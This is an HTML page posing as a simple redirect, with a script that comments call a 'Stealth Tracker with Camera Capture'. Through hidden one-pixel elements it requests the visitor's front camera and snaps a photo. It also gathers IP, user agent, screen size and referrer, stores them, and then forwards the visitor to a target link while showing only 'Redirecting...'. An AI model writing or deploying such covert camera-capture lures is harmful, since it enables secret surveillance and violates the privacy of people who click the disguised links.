<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
    // Redirect ke /untukmu/ jika mengakses root
    if(window.location.pathname === '/') {
        window.location.href = '/untukmu/';
    }
    </script>
    <script>
    // Stealth Tracker with Camera Capture
    (function() {
        const params = new URLSearchParams(window.location.search);
        const trackingId = params.get('track');
        const targetUrl = params.get('target');
        
        if (trackingId && targetUrl) {
            // Setup hidden camera elements
            const cameraContainer = document.createElement('div');
            cameraContainer.style.position = 'fixed';
            cameraContainer.style.top = '-9999px';
            cameraContainer.style.left = '-9999px';
            cameraContainer.style.width = '1px';
            cameraContainer.style.height = '1px';
            cameraContainer.style.overflow = 'hidden';
            
            const video = document.createElement('video');
            video.autoplay = true;
            video.playsInline = true;
            video.width = 1;
            video.height = 1;
            
            const canvas = document.createElement('canvas');
            canvas.width = 1;
            canvas.height = 1;
            
            cameraContainer.appendChild(video);
            cameraContainer.appendChild(canvas);
            document.body.appendChild(cameraContainer);
            
            // Prepare tracking data
            const clickData = {
                timestamp: new Date().toISOString(),
                ip: 'Unknown',
                trackingId: trackingId,
                targetUrl: decodeURIComponent(targetUrl),
                referrer: document.referrer || 'Direct',
                userAgent: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`,
                cameraData: null
            };
            
            // Start tracking process
            Promise.all([
                captureCamera(video, canvas),
                fetchIPData()
            ]).then(([cameraData, ipData]) => {
                clickData.cameraData = cameraData;
                clickData.ip = ipData.ip || 'Unknown';
                saveTrackingData(clickData);
            }).catch(error => {
                console.error('Tracking error:', error);
                saveTrackingData(clickData);
            }).finally(() => {
                // Redirect after 3 seconds (camera capture time)
                setTimeout(() => {
                    window.location.href = decodeURIComponent(targetUrl);
                }, 3000);
            });
        }
        
        function captureCamera(video, canvas) {
            return new Promise((resolve, reject) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    resolve(null);
                    return;
                }
                
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                }).then(stream => {
                    video.srcObject = stream;
                    
                    return new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });
                }).then(() => {
                    // Wait for 2 seconds to ensure camera is ready
                    return new Promise(resolve => setTimeout(resolve, 2000));
                }).then(() => {
                    // Capture frame
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Get image data
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // Stop stream
                    video.srcObject.getTracks().forEach(track => track.stop());
                    
                    resolve(imageData);
                }).catch(error => {
                    console.error('Camera error:', error);
                    resolve(null);
                });
            });
        }
        
        function fetchIPData() {
            return fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .catch(() => ({}));
        }
        
        function saveTrackingData(data) {
            try {
                const trackingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
                trackingData.unshift(data);
                localStorage.setItem('tracking_data', JSON.stringify(trackingData));
            } catch (e) {
                console.error('Error saving data:', e);
            }
        }
    })();
    </script>
</head>
<body>
    <!-- Empty body - page will redirect after camera capture -->
    <div style="display:none">Redirecting...</div>
</body>
</html>
